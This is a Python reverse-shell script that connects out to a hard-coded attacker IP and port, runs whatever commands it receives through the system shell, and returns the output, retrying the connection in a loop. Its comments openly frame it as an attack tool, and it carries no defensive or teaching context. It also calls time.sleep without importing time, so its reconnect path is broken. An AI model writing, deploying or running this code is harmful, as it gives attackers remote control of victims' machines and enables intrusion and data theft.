import socket
import subprocess
import json
import os
import sys

def connect_to_attacker(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print(f"Connected to {host}:{port}")
            
            while True:
                # Receive command from attacker
                command = s.recv(1024).decode('utf-8')
                
                if command.lower() == 'exit':
                    s.close()
                    sys.exit()
                
                # Execute command and get output
                try:
                    if sys.platform.startswith('win'):
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    else:
                        output = subprocess.check_output(['bash', '-c', command], stderr=subprocess.STDOUT, text=True)
                except Exception as e:
                    output = f"Error: {str(e)}"
                
                # Send output back to attacker
                s.sendall(output.encode('utf-8'))
                
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)
            continue

if __name__ == "__main__":
    attacker_ip = "192.168.1.54"  # Your IP address
    attacker_port = 4444  # Port for reverse shell connection
    
    connect_to_attacker(attacker_ip, attacker_port)
